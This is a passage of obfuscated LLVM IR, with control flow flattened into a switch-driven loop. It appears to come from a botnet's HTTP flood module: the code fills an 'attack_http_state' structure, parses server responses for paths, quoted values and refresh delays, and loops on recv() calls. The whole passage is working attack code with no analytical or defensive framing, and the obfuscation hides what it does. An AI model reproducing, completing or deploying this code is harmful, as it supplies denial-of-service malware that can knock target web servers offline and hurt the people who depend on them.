  %1772 = add nsw i32 %1771, 1
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds i8, i8* %1770, i64 %1773
  %1775 = call i32 @util_strcpy(i8* %1769, i8* %1774)
  store i32 -1897337435, i32* %switchVar
  br label %loopEnd

; <label>:1776:                                   ; preds = %loopEntry
  store i32 230841318, i32* %switchVar
  br label %loopEnd

; <label>:1777:                                   ; preds = %loopEntry
  store i32 -1119177753, i32* %switchVar
  br label %loopEnd

; <label>:1778:                                   ; preds = %loopEntry
  %1779 = load i8*, i8** %54, align 8
  %1780 = getelementptr inbounds i8, i8* %1779, i64 0
  %1781 = load i8, i8* %1780, align 1
  %1782 = sext i8 %1781 to i32
  %1783 = icmp eq i32 %1782, 47
  %1784 = select i1 %1783, i32 -1596928931, i32 -1139046325
  store i32 %1784, i32* %switchVar
  br label %loopEnd

; <label>:1785:                                   ; preds = %loopEntry
  %1786 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1787 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1786, i32 0, i32 6
  %1788 = getelementptr inbounds [257 x i8], [257 x i8]* %1787, i32 0, i32 0
  %1789 = getelementptr inbounds i8, i8* %1788, i64 1
  call void @util_zero(i8* %1789, i32 255)
  %1790 = load i8*, i8** %54, align 8
  %1791 = load i32, i32* %10, align 4
  %1792 = add nsw i32 %1791, 1
  %1793 = sext i32 %1792 to i64
  %1794 = getelementptr inbounds i8, i8* %1790, i64 %1793
  %1795 = call i32 @util_strlen(i8* %1794)
  %1796 = icmp sgt i32 %1795, 0
  %1797 = select i1 %1796, i32 -1001081436, i32 1363194391
  store i32 %1797, i32* %switchVar
  br label %loopEnd

; <label>:1798:                                   ; preds = %loopEntry
  %1799 = load i8*, i8** %54, align 8
  %1800 = load i32, i32* %10, align 4
  %1801 = add nsw i32 %1800, 1
  %1802 = sext i32 %1801 to i64
  %1803 = getelementptr inbounds i8, i8* %1799, i64 %1802
  %1804 = call i32 @util_strlen(i8* %1803)
  %1805 = icmp slt i32 %1804, 256
  %1806 = select i1 %1805, i32 -797585261, i32 1363194391
  store i32 %1806, i32* %switchVar
  br label %loopEnd

; <label>:1807:                                   ; preds = %loopEntry
  %1808 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1809 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1808, i32 0, i32 6
  %1810 = getelementptr inbounds [257 x i8], [257 x i8]* %1809, i32 0, i32 0
  %1811 = getelementptr inbounds i8, i8* %1810, i64 1
  %1812 = load i8*, i8** %54, align 8
  %1813 = load i32, i32* %10, align 4
  %1814 = add nsw i32 %1813, 1
  %1815 = sext i32 %1814 to i64
  %1816 = getelementptr inbounds i8, i8* %1812, i64 %1815
  %1817 = call i32 @util_strcpy(i8* %1811, i8* %1816)
  store i32 1363194391, i32* %switchVar
  br label %loopEnd

; <label>:1818:                                   ; preds = %loopEntry
  store i32 -1139046325, i32* %switchVar
  br label %loopEnd

; <label>:1819:                                   ; preds = %loopEntry
  store i32 -1119177753, i32* %switchVar
  br label %loopEnd

; <label>:1820:                                   ; preds = %loopEntry
  %1821 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1821, i32 0, i32 1
  store i8 1, i8* %1822, align 4
  store i32 875992331, i32* %switchVar
  br label %loopEnd

; <label>:1823:                                   ; preds = %loopEntry
  store i32 -381807830, i32* %switchVar
  br label %loopEnd

; <label>:1824:                                   ; preds = %loopEntry
  %1825 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1826 = load i32, i32* %12, align 4
  %1827 = call i8* @table_retrieve_val(i32 37, i32* null)
  %1828 = call i32 @util_stristr(i8* %1825, i32 %1826, i8* %1827)
  %1829 = icmp ne i32 %1828, -1
  %1830 = select i1 %1829, i32 -1812240589, i32 498915131
  store i32 %1830, i32* %switchVar
  br label %loopEnd

; <label>:1831:                                   ; preds = %loopEntry
  %1832 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1833 = load i32, i32* %12, align 4
  %1834 = call i8* @table_retrieve_val(i32 37, i32* null)
  %1835 = call i32 @util_stristr(i8* %1832, i32 %1833, i8* %1834)
  store i32 %1835, i32* %55, align 4
  %1836 = load i32, i32* %55, align 4
  %1837 = sext i32 %1836 to i64
  %1838 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1837
  %1839 = load i8, i8* %1838, align 1
  %1840 = sext i8 %1839 to i32
  %1841 = icmp eq i32 %1840, 32
  %1842 = select i1 %1841, i32 1591653033, i32 -675079103
  store i32 %1842, i32* %switchVar
  br label %loopEnd

; <label>:1843:                                   ; preds = %loopEntry
  %1844 = load i32, i32* %55, align 4
  %1845 = add nsw i32 %1844, 1
  store i32 %1845, i32* %55, align 4
  store i32 -675079103, i32* %switchVar
  br label %loopEnd

; <label>:1846:                                   ; preds = %loopEntry
  %1847 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1848 = load i32, i32* %55, align 4
  %1849 = sext i32 %1848 to i64
  %1850 = getelementptr inbounds i8, i8* %1847, i64 %1849
  %1851 = load i32, i32* %12, align 4
  %1852 = load i32, i32* %55, align 4
  %1853 = sub nsw i32 %1851, %1852
  %1854 = call i32 @util_memsearch(i8* %1850, i32 %1853, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1854, i32* %56, align 4
  %1855 = load i32, i32* %56, align 4
  %1856 = icmp ne i32 %1855, -1
  %1857 = select i1 %1856, i32 1704916924, i32 -670193958
  store i32 %1857, i32* %switchVar
  br label %loopEnd

; <label>:1858:                                   ; preds = %loopEntry
  %1859 = load i32, i32* %55, align 4
  %1860 = sext i32 %1859 to i64
  %1861 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1860
  store i8* %1861, i8** %57, align 8
  %1862 = load i32, i32* %56, align 4
  %1863 = icmp sge i32 %1862, 2
  %1864 = select i1 %1863, i32 648818771, i32 -1103113077
  store i32 %1864, i32* %switchVar
  br label %loopEnd

; <label>:1865:                                   ; preds = %loopEntry
  %1866 = load i32, i32* %56, align 4
  %1867 = sub nsw i32 %1866, 2
  store i32 %1867, i32* %56, align 4
  store i32 -1103113077, i32* %switchVar
  br label %loopEnd

; <label>:1868:                                   ; preds = %loopEntry
  %1869 = load i32, i32* %55, align 4
  %1870 = load i32, i32* %56, align 4
  %1871 = add nsw i32 %1869, %1870
  %1872 = sext i32 %1871 to i64
  %1873 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1872
  store i8 0, i8* %1873, align 1
  %1874 = load i32, i32* %56, align 4
  %1875 = add nsw i32 %1874, 1
  store i32 %1875, i32* %56, align 4
  store i32 0, i32* %10, align 4
  store i32 625613023, i32* %switchVar
  br label %loopEnd

; <label>:1876:                                   ; preds = %loopEntry
  %1877 = load i8*, i8** %57, align 8
  %1878 = load i32, i32* %10, align 4
  %1879 = sext i32 %1878 to i64
  %1880 = getelementptr inbounds i8, i8* %1877, i64 %1879
  %1881 = load i8, i8* %1880, align 1
  %1882 = sext i8 %1881 to i32
  %1883 = icmp ne i32 %1882, 0
  %1884 = select i1 %1883, i32 -1659366523, i32 -109099525
  store i32 %1884, i32* %switchVar
  store i1 false, i1* %.reg2mem49
  br label %loopEnd

; <label>:1885:                                   ; preds = %loopEntry
  %1886 = load i8*, i8** %57, align 8
  %1887 = load i32, i32* %10, align 4
  %1888 = sext i32 %1887 to i64
  %1889 = getelementptr inbounds i8, i8* %1886, i64 %1888
  %1890 = load i8, i8* %1889, align 1
  %1891 = sext i8 %1890 to i32
  %1892 = icmp sge i32 %1891, 48
  %1893 = select i1 %1892, i32 -955514103, i32 -109099525
  store i32 %1893, i32* %switchVar
  store i1 false, i1* %.reg2mem49
  br label %loopEnd

; <label>:1894:                                   ; preds = %loopEntry
  %1895 = load i8*, i8** %57, align 8
  %1896 = load i32, i32* %10, align 4
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds i8, i8* %1895, i64 %1897
  %1899 = load i8, i8* %1898, align 1
  %1900 = sext i8 %1899 to i32
  %1901 = icmp sle i32 %1900, 57
  store i32 -109099525, i32* %switchVar
  store i1 %1901, i1* %.reg2mem49
  br label %loopEnd

; <label>:1902:                                   ; preds = %loopEntry
  %.reload50 = load i1, i1* %.reg2mem49
  %1903 = select i1 %.reload50, i32 -445771968, i32 2144909862
  store i32 %1903, i32* %switchVar
  br label %loopEnd

; <label>:1904:                                   ; preds = %loopEntry
  %1905 = load i32, i32* %10, align 4
  %1906 = add nsw i32 %1905, 1
  store i32 %1906, i32* %10, align 4
  store i32 625613023, i32* %switchVar
  br label %loopEnd

; <label>:1907:                                   ; preds = %loopEntry
  %1908 = load i8*, i8** %57, align 8
  %1909 = load i32, i32* %10, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds i8, i8* %1908, i64 %1910
  %1912 = load i8, i8* %1911, align 1
  %1913 = sext i8 %1912 to i32
  %1914 = icmp ne i32 %1913, 0
  %1915 = select i1 %1914, i32 1159495349, i32 -666724380
  store i32 %1915, i32* %switchVar
  br label %loopEnd

; <label>:1916:                                   ; preds = %loopEntry
  store i32 0, i32* %58, align 4
  %1917 = load i8*, i8** %57, align 8
  %1918 = load i32, i32* %10, align 4
  %1919 = sext i32 %1918 to i64
  %1920 = getelementptr inbounds i8, i8* %1917, i64 %1919
  store i8 0, i8* %1920, align 1
  %1921 = load i32, i32* %10, align 4
  %1922 = add nsw i32 %1921, 1
  store i32 %1922, i32* %10, align 4
  %1923 = load i8*, i8** %57, align 8
  %1924 = load i32, i32* %10, align 4
  %1925 = sext i32 %1924 to i64
  %1926 = getelementptr inbounds i8, i8* %1923, i64 %1925
  %1927 = load i8, i8* %1926, align 1
  %1928 = sext i8 %1927 to i32
  %1929 = icmp eq i32 %1928, 32
  %1930 = select i1 %1929, i32 -1720379778, i32 -1955541839
  store i32 %1930, i32* %switchVar
  br label %loopEnd

; <label>:1931:                                   ; preds = %loopEntry
  %1932 = load i32, i32* %10, align 4
  %1933 = add nsw i32 %1932, 1
  store i32 %1933, i32* %10, align 4
  store i32 -1955541839, i32* %switchVar
  br label %loopEnd

; <label>:1934:                                   ; preds = %loopEntry
  %1935 = load i8*, i8** %57, align 8
  %1936 = load i32, i32* %10, align 4
  %1937 = sext i32 %1936 to i64
  %1938 = getelementptr inbounds i8, i8* %1935, i64 %1937
  %1939 = load i8*, i8** %57, align 8
  %1940 = load i32, i32* %10, align 4
  %1941 = sext i32 %1940 to i64
  %1942 = getelementptr inbounds i8, i8* %1939, i64 %1941
  %1943 = call i32 @util_strlen(i8* %1942)
  %1944 = call i32 @util_stristr(i8* %1938, i32 %1943, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1945 = icmp ne i32 %1944, -1
  %1946 = select i1 %1945, i32 -899781440, i32 -2073890462
  store i32 %1946, i32* %switchVar
  br label %loopEnd

; <label>:1947:                                   ; preds = %loopEntry
  %1948 = load i8*, i8** %57, align 8
  %1949 = load i32, i32* %10, align 4
  %1950 = sext i32 %1949 to i64
  %1951 = getelementptr inbounds i8, i8* %1948, i64 %1950
  %1952 = load i8*, i8** %57, align 8
  %1953 = load i32, i32* %10, align 4
  %1954 = sext i32 %1953 to i64
  %1955 = getelementptr inbounds i8, i8* %1952, i64 %1954
  %1956 = call i32 @util_strlen(i8* %1955)
  %1957 = call i32 @util_stristr(i8* %1951, i32 %1956, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1958 = load i32, i32* %10, align 4
  %1959 = add nsw i32 %1958, %1957
  store i32 %1959, i32* %10, align 4
  store i32 -2073890462, i32* %switchVar
  br label %loopEnd

; <label>:1960:                                   ; preds = %loopEntry
  %1961 = load i8*, i8** %57, align 8
  %1962 = load i32, i32* %10, align 4
  %1963 = sext i32 %1962 to i64
  %1964 = getelementptr inbounds i8, i8* %1961, i64 %1963
  %1965 = load i8, i8* %1964, align 1
  %1966 = sext i8 %1965 to i32
  %1967 = icmp eq i32 %1966, 34
  %1968 = select i1 %1967, i32 813681453, i32 915227770
  store i32 %1968, i32* %switchVar
  br label %loopEnd

; <label>:1969:                                   ; preds = %loopEntry
  %1970 = load i32, i32* %10, align 4
  %1971 = add nsw i32 %1970, 1
  store i32 %1971, i32* %10, align 4
  %1972 = load i8*, i8** %57, align 8
  %1973 = load i32, i32* %10, align 4
  %1974 = sext i32 %1973 to i64
  %1975 = getelementptr inbounds i8, i8* %1972, i64 %1974
  %1976 = load i8*, i8** %57, align 8
  %1977 = load i32, i32* %10, align 4
  %1978 = sext i32 %1977 to i64
  %1979 = getelementptr inbounds i8, i8* %1976, i64 %1978
  %1980 = call i32 @util_strlen(i8* %1979)
  %1981 = sub nsw i32 %1980, 1
  %1982 = sext i32 %1981 to i64
  %1983 = getelementptr inbounds i8, i8* %1975, i64 %1982
  %1984 = load i8, i8* %1983, align 1
  %1985 = sext i8 %1984 to i32
  %1986 = icmp eq i32 %1985, 34
  %1987 = select i1 %1986, i32 -614100921, i32 -1769556528
  store i32 %1987, i32* %switchVar
  br label %loopEnd

; <label>:1988:                                   ; preds = %loopEntry
  %1989 = load i8*, i8** %57, align 8
  %1990 = load i32, i32* %10, align 4
  %1991 = sext i32 %1990 to i64
  %1992 = getelementptr inbounds i8, i8* %1989, i64 %1991
  %1993 = load i8*, i8** %57, align 8
  %1994 = load i32, i32* %10, align 4
  %1995 = sext i32 %1994 to i64
  %1996 = getelementptr inbounds i8, i8* %1993, i64 %1995
  %1997 = call i32 @util_strlen(i8* %1996)
  %1998 = sub nsw i32 %1997, 1
  %1999 = sext i32 %1998 to i64
  %2000 = getelementptr inbounds i8, i8* %1992, i64 %1999
  store i8 0, i8* %2000, align 1
  store i32 -1769556528, i32* %switchVar
  br label %loopEnd

; <label>:2001:                                   ; preds = %loopEntry
  store i32 915227770, i32* %switchVar
  br label %loopEnd

; <label>:2002:                                   ; preds = %loopEntry
  %2003 = load i8*, i8** %57, align 8
  %2004 = call i32 @util_atoi(i8* %2003, i32 10)
  store i32 %2004, i32* %58, align 4
  store i32 -549919443, i32* %switchVar
  br label %loopEnd

; <label>:2005:                                   ; preds = %loopEntry
  %2006 = load i32, i32* %58, align 4
  %2007 = icmp sgt i32 %2006, 0
  %2008 = select i1 %2007, i32 1734303128, i32 1128748432
  store i32 %2008, i32* %switchVar
  store i1 false, i1* %.reg2mem51
  br label %loopEnd

; <label>:2009:                                   ; preds = %loopEntry
  %2010 = load i32, i32* %58, align 4
  %2011 = icmp slt i32 %2010, 10
  %2012 = select i1 %2011, i32 -433374446, i32 1128748432
  store i32 %2012, i32* %switchVar
  store i1 false, i1* %.reg2mem51
  br label %loopEnd

; <label>:2013:                                   ; preds = %loopEntry
  %2014 = load i32, i32* %27, align 4
  %2015 = load i32, i32* %58, align 4
  %2016 = add i32 %2014, %2015
  %2017 = zext i32 %2016 to i64
  %2018 = call i64 @time(i64* null) #6
  %2019 = icmp sgt i64 %2017, %2018
  store i32 1128748432, i32* %switchVar
  store i1 %2019, i1* %.reg2mem51
  br label %loopEnd

; <label>:2020:                                   ; preds = %loopEntry
  %.reload52 = load i1, i1* %.reg2mem51
  %2021 = select i1 %.reload52, i32 -443529046, i32 522488022
  store i32 %2021, i32* %switchVar
  br label %loopEnd

; <label>:2022:                                   ; preds = %loopEntry
  %2023 = call i32 @sleep(i32 1)
  store i32 -549919443, i32* %switchVar
  br label %loopEnd

; <label>:2024:                                   ; preds = %loopEntry
  %2025 = load i8*, i8** %57, align 8
  %2026 = load i32, i32* %10, align 4
  %2027 = sext i32 %2026 to i64
  %2028 = getelementptr inbounds i8, i8* %2025, i64 %2027
  store i8* %2028, i8** %57, align 8
  %2029 = load i8*, i8** %57, align 8
  %2030 = load i8*, i8** %57, align 8
  %2031 = call i32 @util_strlen(i8* %2030)
  %2032 = call i32 @util_stristr(i8* %2029, i32 %2031, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2033 = icmp eq i32 %2032, 4
  %2034 = select i1 %2033, i32 -582457299, i32 1784581483
  store i32 %2034, i32* %switchVar
  br label %loopEnd

; <label>:2035:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %2036 = load i8*, i8** %57, align 8
  %2037 = getelementptr inbounds i8, i8* %2036, i64 4
  %2038 = load i8, i8* %2037, align 1
  %2039 = sext i8 %2038 to i32
  %2040 = icmp eq i32 %2039, 115
  %2041 = select i1 %2040, i32 603272675, i32 -1464851589
  store i32 %2041, i32* %switchVar
  br label %loopEnd

; <label>:2042:                                   ; preds = %loopEntry
  %2043 = load i32, i32* %10, align 4
  %2044 = add nsw i32 %2043, 1
  store i32 %2044, i32* %10, align 4
  store i32 -1464851589, i32* %switchVar
  br label %loopEnd

; <label>:2045:                                   ; preds = %loopEntry
  %2046 = load i8*, i8** %57, align 8
  %2047 = load i8*, i8** %57, align 8
  %2048 = load i32, i32* %10, align 4
  %2049 = sext i32 %2048 to i64
  %2050 = getelementptr inbounds i8, i8* %2047, i64 %2049
  %2051 = load i32, i32* %56, align 4
  %2052 = load i32, i32* %10, align 4
  %2053 = sub nsw i32 %2051, %2052
  %2054 = sext i32 %2053 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2046, i8* %2050, i64 %2054, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 1439642485, i32* %switchVar
  br label %loopEnd

; <label>:2055:                                   ; preds = %loopEntry
  %2056 = load i8*, i8** %57, align 8
  %2057 = load i32, i32* %10, align 4
  %2058 = sext i32 %2057 to i64
  %2059 = getelementptr inbounds i8, i8* %2056, i64 %2058
  %2060 = load i8, i8* %2059, align 1
  %2061 = sext i8 %2060 to i32
  %2062 = icmp ne i32 %2061, 0
  %2063 = select i1 %2062, i32 -1234269622, i32 -718670547
  store i32 %2063, i32* %switchVar
  br label %loopEnd

; <label>:2064:                                   ; preds = %loopEntry
  %2065 = load i8*, i8** %57, align 8
  %2066 = load i32, i32* %10, align 4
  %2067 = sext i32 %2066 to i64
  %2068 = getelementptr inbounds i8, i8* %2065, i64 %2067
  %2069 = load i8, i8* %2068, align 1
  %2070 = sext i8 %2069 to i32
  %2071 = icmp eq i32 %2070, 47
  %2072 = select i1 %2071, i32 1820171619, i32 328033701
  store i32 %2072, i32* %switchVar
  br label %loopEnd

; <label>:2073:                                   ; preds = %loopEntry
  %2074 = load i8*, i8** %57, align 8
  %2075 = load i32, i32* %10, align 4
  %2076 = sext i32 %2075 to i64
  %2077 = getelementptr inbounds i8, i8* %2074, i64 %2076
  store i8 0, i8* %2077, align 1
  store i32 -718670547, i32* %switchVar
  br label %loopEnd

; <label>:2078:                                   ; preds = %loopEntry
  %2079 = load i32, i32* %10, align 4
  %2080 = add nsw i32 %2079, 1
  store i32 %2080, i32* %10, align 4
  store i32 1439642485, i32* %switchVar
  br label %loopEnd

; <label>:2081:                                   ; preds = %loopEntry
  %2082 = load i8*, i8** %57, align 8
  %2083 = call i32 @util_strlen(i8* %2082)
  %2084 = icmp sgt i32 %2083, 0
  %2085 = select i1 %2084, i32 307120317, i32 -1484091971
  store i32 %2085, i32* %switchVar
  br label %loopEnd

; <label>:2086:                                   ; preds = %loopEntry
  %2087 = load i8*, i8** %57, align 8
  %2088 = call i32 @util_strlen(i8* %2087)
  %2089 = icmp slt i32 %2088, 128
  %2090 = select i1 %2089, i32 -1391202313, i32 -1484091971
  store i32 %2090, i32* %switchVar
  br label %loopEnd

; <label>:2091:                                   ; preds = %loopEntry
  %2092 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2093 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2092, i32 0, i32 7
  %2094 = getelementptr inbounds [129 x i8], [129 x i8]* %2093, i32 0, i32 0
  %2095 = load i8*, i8** %57, align 8
  %2096 = call i32 @util_strcpy(i8* %2094, i8* %2095)
  store i32 -1484091971, i32* %switchVar
  br label %loopEnd

; <label>:2097:                                   ; preds = %loopEntry
  %2098 = load i8*, i8** %57, align 8
  %2099 = load i32, i32* %10, align 4
  %2100 = add nsw i32 %2099, 1
  %2101 = sext i32 %2100 to i64
  %2102 = getelementptr inbounds i8, i8* %2098, i64 %2101
  %2103 = call i32 @util_strlen(i8* %2102)
  %2104 = icmp slt i32 %2103, 256
  %2105 = select i1 %2104, i32 -252761982, i32 1888094325
  store i32 %2105, i32* %switchVar
  br label %loopEnd

; <label>:2106:                                   ; preds = %loopEntry
  %2107 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2107, i32 0, i32 6
  %2109 = getelementptr inbounds [257 x i8], [257 x i8]* %2108, i32 0, i32 0
  %2110 = getelementptr inbounds i8, i8* %2109, i64 1
  call void @util_zero(i8* %2110, i32 255)
  %2111 = load i8*, i8** %57, align 8
  %2112 = load i32, i32* %10, align 4
  %2113 = add nsw i32 %2112, 1
  %2114 = sext i32 %2113 to i64
  %2115 = getelementptr inbounds i8, i8* %2111, i64 %2114
  %2116 = call i32 @util_strlen(i8* %2115)
  %2117 = icmp sgt i32 %2116, 0
  %2118 = select i1 %2117, i32 -1746169408, i32 814904624
  store i32 %2118, i32* %switchVar
  br label %loopEnd

; <label>:2119:                                   ; preds = %loopEntry
  %2120 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2121 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2120, i32 0, i32 6
  %2122 = getelementptr inbounds [257 x i8], [257 x i8]* %2121, i32 0, i32 0
  %2123 = getelementptr inbounds i8, i8* %2122, i64 1
  %2124 = load i8*, i8** %57, align 8
  %2125 = load i32, i32* %10, align 4
  %2126 = add nsw i32 %2125, 1
  %2127 = sext i32 %2126 to i64
  %2128 = getelementptr inbounds i8, i8* %2124, i64 %2127
  %2129 = call i32 @util_strcpy(i8* %2123, i8* %2128)
  store i32 814904624, i32* %switchVar
  br label %loopEnd

; <label>:2130:                                   ; preds = %loopEntry
  store i32 1888094325, i32* %switchVar
  br label %loopEnd

; <label>:2131:                                   ; preds = %loopEntry
  store i32 -1693680398, i32* %switchVar
  br label %loopEnd

; <label>:2132:                                   ; preds = %loopEntry
  %2133 = load i8*, i8** %57, align 8
  %2134 = getelementptr inbounds i8, i8* %2133, i64 0
  %2135 = load i8, i8* %2134, align 1
  %2136 = sext i8 %2135 to i32
  %2137 = icmp eq i32 %2136, 47
  %2138 = select i1 %2137, i32 2133631574, i32 -222931122
  store i32 %2138, i32* %switchVar
  br label %loopEnd

; <label>:2139:                                   ; preds = %loopEntry
  %2140 = load i8*, i8** %57, align 8
  %2141 = load i32, i32* %10, align 4
  %2142 = add nsw i32 %2141, 1
  %2143 = sext i32 %2142 to i64
  %2144 = getelementptr inbounds i8, i8* %2140, i64 %2143
  %2145 = call i32 @util_strlen(i8* %2144)
  %2146 = icmp slt i32 %2145, 256
  %2147 = select i1 %2146, i32 -1003184770, i32 -853590975
  store i32 %2147, i32* %switchVar
  br label %loopEnd

; <label>:2148:                                   ; preds = %loopEntry
  %2149 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2150 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2149, i32 0, i32 6
  %2151 = getelementptr inbounds [257 x i8], [257 x i8]* %2150, i32 0, i32 0
  %2152 = getelementptr inbounds i8, i8* %2151, i64 1
  call void @util_zero(i8* %2152, i32 255)
  %2153 = load i8*, i8** %57, align 8
  %2154 = load i32, i32* %10, align 4
  %2155 = add nsw i32 %2154, 1
  %2156 = sext i32 %2155 to i64
  %2157 = getelementptr inbounds i8, i8* %2153, i64 %2156
  %2158 = call i32 @util_strlen(i8* %2157)
  %2159 = icmp sgt i32 %2158, 0
  %2160 = select i1 %2159, i32 1279491360, i32 1507882174
  store i32 %2160, i32* %switchVar
  br label %loopEnd

; <label>:2161:                                   ; preds = %loopEntry
  %2162 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2162, i32 0, i32 6
  %2164 = getelementptr inbounds [257 x i8], [257 x i8]* %2163, i32 0, i32 0
  %2165 = getelementptr inbounds i8, i8* %2164, i64 1
  %2166 = load i8*, i8** %57, align 8
  %2167 = load i32, i32* %10, align 4
  %2168 = add nsw i32 %2167, 1
  %2169 = sext i32 %2168 to i64
  %2170 = getelementptr inbounds i8, i8* %2166, i64 %2169
  %2171 = call i32 @util_strcpy(i8* %2165, i8* %2170)
  store i32 1507882174, i32* %switchVar
  br label %loopEnd

; <label>:2172:                                   ; preds = %loopEntry
  store i32 -853590975, i32* %switchVar
  br label %loopEnd

; <label>:2173:                                   ; preds = %loopEntry
  store i32 -222931122, i32* %switchVar
  br label %loopEnd

; <label>:2174:                                   ; preds = %loopEntry
  store i32 -1693680398, i32* %switchVar
  br label %loopEnd

; <label>:2175:                                   ; preds = %loopEntry
  %2176 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2176, i32 0, i32 9
  %2178 = getelementptr inbounds [9 x i8], [9 x i8]* %2177, i32 0, i32 0
  %2179 = call i8* @strcpy(i8* %2178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2180 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2180, i32 0, i32 1
  store i8 10, i8* %2181, align 4
  store i32 875992331, i32* %switchVar
  br label %loopEnd

; <label>:2182:                                   ; preds = %loopEntry
  store i32 -670193958, i32* %switchVar
  br label %loopEnd

; <label>:2183:                                   ; preds = %loopEntry
  store i32 498915131, i32* %switchVar
  br label %loopEnd

; <label>:2184:                                   ; preds = %loopEntry
  %2185 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2186 = load i32, i32* %12, align 4
  %2187 = call i32 @util_memsearch(i8* %2185, i32 %2186, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2187, i32* %37, align 4
  %2188 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2188, i32 0, i32 9
  %2190 = getelementptr inbounds [9 x i8], [9 x i8]* %2189, i32 0, i32 0
  %2191 = call signext i8 @util_strcmp(i8* %2190, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2192 = sext i8 %2191 to i32
  %2193 = icmp ne i32 %2192, 0
  %2194 = select i1 %2193, i32 -1183887003, i32 -1237853288
  store i32 %2194, i32* %switchVar
  br label %loopEnd

; <label>:2195:                                   ; preds = %loopEntry
  %2196 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2196, i32 0, i32 9
  %2198 = getelementptr inbounds [9 x i8], [9 x i8]* %2197, i32 0, i32 0
  %2199 = call signext i8 @util_strcmp(i8* %2198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2200 = sext i8 %2199 to i32
  %2201 = icmp ne i32 %2200, 0
  %2202 = select i1 %2201, i32 -1183887003, i32 -1821129394
  store i32 %2202, i32* %switchVar
  br label %loopEnd

; <label>:2203:                                   ; preds = %loopEntry
  %2204 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2204, i32 0, i32 1
  store i8 7, i8* %2205, align 4
  store i32 398000236, i32* %switchVar
  br label %loopEnd

; <label>:2206:                                   ; preds = %loopEntry
  %2207 = load i32, i32* %12, align 4
  %2208 = load i32, i32* %37, align 4
  %2209 = icmp sgt i32 %2207, %2208
  %2210 = select i1 %2209, i32 1620232083, i32 860714842
  store i32 %2210, i32* %switchVar
  br label %loopEnd

; <label>:2211:                                   ; preds = %loopEntry
  %2212 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2212, i32 0, i32 1
  store i8 10, i8* %2213, align 4
  store i32 -276088327, i32* %switchVar
  br label %loopEnd

; <label>:2214:                                   ; preds = %loopEntry
  %2215 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2216 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2215, i32 0, i32 1
  store i8 1, i8* %2216, align 4
  store i32 -276088327, i32* %switchVar
  br label %loopEnd

; <label>:2217:                                   ; preds = %loopEntry
  store i32 398000236, i32* %switchVar
  br label %loopEnd

; <label>:2218:                                   ; preds = %loopEntry
  %2219 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2219, i32 0, i32 0
  %2221 = load i32, i32* %2220, align 4
  %2222 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2223 = load i32, i32* %37, align 4
  %2224 = sext i32 %2223 to i64
  %2225 = call i64 @recv(i32 %2221, i8* %2222, i64 %2224, i32 16384)
  %2226 = trunc i64 %2225 to i32
  store i32 %2226, i32* %12, align 4
  store i32 -1957351390, i32* %switchVar
  br label %loopEnd

; <label>:2227:                                   ; preds = %loopEntry
